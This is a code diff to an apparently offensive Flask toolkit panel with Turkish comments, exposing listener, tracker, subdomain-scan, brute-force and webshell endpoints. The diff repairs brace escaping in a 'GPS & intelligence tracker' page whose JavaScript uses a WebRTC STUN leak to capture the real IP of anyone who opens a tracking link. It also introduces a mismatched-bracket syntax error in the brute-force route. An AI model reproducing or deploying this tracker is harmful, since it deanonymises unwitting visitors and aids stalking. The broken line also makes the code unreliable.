@@ -623,7 +623,7 @@ def api_listener_start():
     port = request.get_json().get("port", 4444)
     return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi.\n(Not: Render/PaaS ortamlarında harici port açılması kısıtlı olduğundan simüle edildi.)"})
 
-# --- GELİŞMİŞ GPS & İSTİHBARAT TRACKER ROTA ---
+# --- GELİŞMİŞ GPS & İSTİHBARAT TRACKER ROTA (ÇİFT SÜSLÜ PARANTEZ İLE DÜZELTİLDİ) ---
 @app.route("/track/<track_id>")
 def track_visitor(track_id):
     return f"""
@@ -667,7 +667,7 @@ def track_visitor(track_id):
 
                 // 2. WebRTC IP Sızıntısı
                 try {{
-                    let pc = new RTCPeerConnection({{{{iceServers:[{{urls:"stun:stun.l.google.com:19302"}}]}}}});
+                    let pc = new RTCPeerConnection({{iceServers:[{{urls:"stun:stun.l.google.com:19302"}}]}});
                     pc.createDataChannel("");
                     pc.createOffer().then(offer => pc.setLocalDescription(offer));
                     pc.onicecandidate = ice => {{
@@ -819,7 +819,7 @@ def api_subdomain_scan():
 
 @app.route("/api/brute-force", methods=["POST"])
 def api_brute_force():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}}, 401
     return jsonify({"report": "Brute-force sequence completed."})
 
 @app.route("/api/webshell", methods=["POST"])
